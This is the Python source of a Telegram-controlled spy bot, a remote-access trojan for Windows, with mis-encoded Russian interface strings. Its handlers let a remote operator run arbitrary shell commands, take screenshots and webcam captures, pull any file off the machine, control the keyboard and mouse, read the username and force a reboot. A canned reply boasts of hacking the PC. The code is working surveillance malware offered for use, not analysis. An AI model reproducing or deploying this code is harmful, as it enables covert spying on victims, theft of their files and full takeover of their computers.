# Modules.
from telebot import * # Telegram module.
from json import load # Parse Json.
from messages.welcome import welcome as welcome_message # Welcome message.
from messages.help import _help as help_message # Help message.
from messages.about import about as about_message # About message.
from messages.credits import _credits as credits_message # Credits message.
from messages.commands import commands as commands_message # Commands message.
from assets import \
	_screenshot_win32, alert, speak, \
		ctime, system, press, \
			typewrite, startfile, cv2, \
				click, position, user \
					# Assets.



# Parse config.
def config(key):
	with open('config.json', 'r') as _config: return load(_config)[key]

# Spy-bot client.
spybot = TeleBot(config('Token'))

# Commands.
commands = {
	'start': 'start',
	'help': 'help',
	'about': 'about',
	'credits': 'credits',
	'screenshot': 'screenshot',
	'message': 'message',
	'say': 'say',
	'cmd': 'cmd',
	'press': 'press',
	'typewrite': 'typewrite',
	'click': 'click',
	'mousepos': 'mousepos',
	'startfile': 'startfile',
	'webcam': 'webcam',
	'getfile': 'getfile',
	'pc-username': 'username',
	'shutdown': 'shutdown',
	'commands': 'commands',
	'clear': 'clear'
}

start = commands['start']
_help = commands['help']
about = commands['about']
_credits = commands['credits']
screenshot = commands['screenshot']
message = commands['message']
say = commands['say']
cmd = commands['cmd']
_press = commands['press']
_typewrite = commands['typewrite']
_click = commands['click']
_startfile = commands['startfile']
webcam = commands['webcam']
clear = commands['clear']
getfile = commands['getfile']
mousepos = commands['mousepos']
pc_username = commands['pc-username']
shutdown = commands['shutdown']
_commands = commands['commands']

# Arguments missed.
some_arguments_missed = '–ö–∞–∫–∏–µ-—Ç–æ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –Ω–µ —É–∫–∞–∑–∞–Ω—ã... üòê'

# Start bot.
@spybot.message_handler(commands = [start])
def start_func(message): spybot.send_message(message.chat.id, welcome_message)

# Help.
@spybot.message_handler(commands = [_help])
def help_func(message): spybot.send_message(message.chat.id, help_message)

# About.
@spybot.message_handler(commands = [about])
def about_func(message): spybot.send_message(message.chat.id, about_message)

# Credits.
@spybot.message_handler(commands = [_credits])
def credits_func(message): spybot.send_message(message.chat.id, credits_message)

# Screenshot.
@spybot.message_handler(commands = [screenshot])
def screenshot_func(message):
	try:
		_screenshot_win32('screenshots\\screenshot.png')
	except FileExistsError:
		from os import remove

		remove('screenshots\\screenshot.png')
		_screenshot_win32('screenshots\\screenshot.png')

	spybot.send_photo(message.chat.id, open('screenshots\\screenshot.png', 'rb'), ctime())

# Message.
@spybot.message_handler(commands = [message])
def message_func(message):
	try:
		spybot.send_message(message.chat.id, f'–ó–∞–≥–æ–ª–æ–≤–æ–∫: {message.text.split()[1]}\n–¢–µ–∫—Å—Ç: {message.text.split()[2]}\n–¢–µ–∫—Å—Ç: {message.text.split()[3]}')
		alert(message.text.split()[2], message.text.split()[1], message.text.split()[3])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, '–ü–æ–¥—Å–∫–∞–∑–∫–∞:\n/message [–ó–∞–≥–æ–ª–æ–≤–æ–∫: —Å—Ç—Ä–æ–∫–∞][–¢–µ–∫—Å—Ç: —Å—Ç—Ä–æ–∫–∞][–ö–Ω–æ–ø–∫–∞: —Å—Ç—Ä–æ–∫–∞].')

# Say.
@spybot.message_handler(commands = [say])
def say_func(message):
	try:
		spybot.send_message(message.chat.id, f'–¢–µ–∫—Å—Ç: {message.text.split()[1]}')
		speak(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, '–ü–æ–¥—Å–∫–∞–∑–∫–∞:\n/say [–¢–µ–∫—Å—Ç: —Å—Ç—Ä–æ–∫–∞].')

# Command to cmd.
@spybot.message_handler(commands = [cmd])
def cmd_func(message):
	try:
		command = message.text.replace(' ', '_').split('!')
		spybot.send_message(message.chat.id, '–ö–æ–º–º–∞–Ω–¥–∞: {}'.format(command[1].replace('_', ' ')))
		system(command[1].replace('_', ' '))
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, '–ü–æ–¥—Å–∫–∞–∑–∫–∞:\n/cmd [!][–ö–æ–º–º–∞–Ω–¥–∞: —Å—Ç—Ä–æ–∫–∞].\n! - –†–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å.')

# Press key
@spybot.message_handler(commands = [_press])
def press_func(message):
	try:
		spybot.send_message(message.chat.id, f'–ö–ª–∞–≤–∏—à–∞: {message.text.split()[1]}')
		press(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, '–ü–æ–¥—Å–∫–∞–∑–∫–∞:\n/press [–ö–ª–∞–≤–∏—à–∞: —Å—Ç—Ä–æ–∫–∞].')

# Write word.
@spybot.message_handler(commands = [_typewrite])
def typewrite_func(message):
	try:
		spybot.send_message(message.chat.id, f'–¢–µ–∫—Å—Ç: {message.text.split()[1]}\n–ò–Ω—Ç–µ—Ä–≤–∞–ª: {message.text.split()[2]}')
		typewrite(message.text.split()[1], float(message.text.split()[2]))
	except (IndexError, ValueError) as error:
		if 'list' in str(error):
			spybot.send_message(message.chat.id, some_arguments_missed)
			spybot.send_message(message.chat.id, '–ü–æ–¥—Å–∫–∞–∑–∫–∞:\n/typewrite [–¢–µ–∫—Å—Ç: —Å—Ç—Ä–æ–∫–∞][–ò–Ω—Ç–µ—Ä–≤–∞–ª: —á–∏—Å–ª–æ].')

		elif 'float' in str(error):
			spybot.send_message(message.chat.id, '–ò–Ω—Ç–µ—Ä–≤–∞–ª –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ü–∏—Ñ—Ä–æ–π!')

# Click.
@spybot.message_handler(commands = [_click])
def click_func(message):
	try:
		spybot.send_message(message.chat.id, f'X: {message.text.split()[1]}\nY: {message.text.split()[2]}\n–ö–ª–∏–∫–æ–≤: {message.text.split()[3]}')
		click(int(message.text.split()[1]), int(message.text.split()[2]), int(message.text.split()[3]))
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, '–ü–æ–¥—Å–∫–∞–∑–∫–∞:\n/click [X: —á–∏—Å–ª–æ][Y: —á–∏—Å–ª–æ][–ö–ª–∏–∫–æ–≤: —á–∏—Å–ª–æ].')

# Mouse position.
@spybot.message_handler(commands = [mousepos])
def mousepos_func(message): spybot.send_message(message.chat.id, f'X: {list(position())[0]}\nY: {list(position())[1]}')

# Startfile.
@spybot.message_handler(commands = [_startfile])
def startfile_func(message):
	try:
		spybot.send_message(message.chat.id, f'–§–∞–π–ª: {message.text.split()[1]}')
		startfile(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, '–ü–æ–¥—Å–∫–∞–∑–∫–∞:\n/startfile [–§–∞–π–ª: —Å—Ç—Ä–æ–∫–∞ (–ø—É—Ç—å)].')

# Webcam screenshot.
@spybot.message_handler(commands = [webcam])
def webcam_func(message):
	frames = 10 * 3
	cap = cv2.VideoCapture(0)
	for _ in range(frames): cap.read()
	ret, frame = cap.read()
	try:
		cv2.imwrite('webcam-screenshots\\webcam-screenshot.png', frame)
	except FileExistsError:
		from os import remove

		remove('webcam-screenshots\\webcam-screenshot.png')
		cv2.imwrite('webcam-screenshots\\webcam-screenshot.png', frame)

	finally:
		cap.release()
		spybot.send_photo(message.chat.id, open('webcam-screenshots\\webcam-screenshot.png', 'rb'), ctime())

# Get file from PC.
@spybot.message_handler(commands = [getfile])
def getfile_func(message):
	try:
		spybot.send_document(message.chat.id, open(message.text.split()[1], 'rb'))
	except FileNotFoundError: spybot.send_message(message.chat.id, '–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω... üò•')
	except PermissionError: spybot.send_message(message.chat.id, 'Windows –Ω–µ –¥–∞–ª–∞ –ø—Ä–∞–≤ –¥–∞–≤–∞—Ç—å –Ω–∞–º —ç—Ç–æ—Ç —Ñ–∞–π–ª... üò•')
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, '–ü–æ–¥—Å–∫–∞–∑–∫–∞:\n/getfile [–§–∞–π–ª: —Å—Ç—Ä–æ–∫–∞].')

# Get username.
@spybot.message_handler(commands = [pc_username])
def pc_username_func(message): spybot.send_message(message.chat.id, f'–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {user()}')

# Shutdown.
@spybot.message_handler(commands = [shutdown])
def shutdown_func(message):
	spybot.send_message(message.chat.id, '–í—ã–∫–ª—é—á–∞–µ–º –ø–∫...')
	system('shutdown /r')

# Commands.
@spybot.message_handler(commands = [_commands])
def commands_func(message): spybot.send_message(message.chat.id, commands_message)

# Clear folders.
@spybot.message_handler(commands = [clear])
def clear_func(message):
	from os import remove
	try:
		remove('screenshots\\screenshot.png')
		remove('webcam-screenshots\\webcam-screenshot.png')
	except FileNotFoundError: spybot.send_message(message.chat.id, '–ù–µ–∫–æ—Ç–æ—Ä—ã–µ —Ñ–∞–π–ª—ã –Ω–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω—ã.')
	finally:
		del remove
		spybot.send_message(message.chat.id, '–ü–∞–ø–∫–∏ –æ—á–∏—â–µ–Ω—ã.')

# Speak.
@spybot.message_handler(content_types = ['text'])
def chatbot(message):
	if '–ø—Ä–∏–≤–µ—Ç' in message.text.lower(): spybot.send_message(message.chat.id, '–ü—Ä–∏–≤–µ—Ç!')
	elif '–ø–æ–∫–∞' in message.text.lower(): spybot.send_message(message.chat.id, '–ü–æ–∫–∞!')
	elif '–∫–∞–∫ –¥–µ–ª–∞' in message.text.lower(): spybot.send_message(message.chat.id, '–•–æ—Ä–æ—à–æ!')
	elif '—á—Ç–æ –¥–µ–ª–∞–µ—à—å' in message.text.lower(): spybot.send_message(message.chat.id, '–í–∑–ª–∞–º—ã–≤–∞—é –ø–∫!')
	elif '–æ–∫' in message.text.lower(): spybot.send_message(message.chat.id, '–û–∫!')
	else: spybot.send_message(message.chat.id, '–ù–µ –ø–æ–Ω—è–ª —Ç–µ–±—è.')

# Run.
spybot.polling(True)
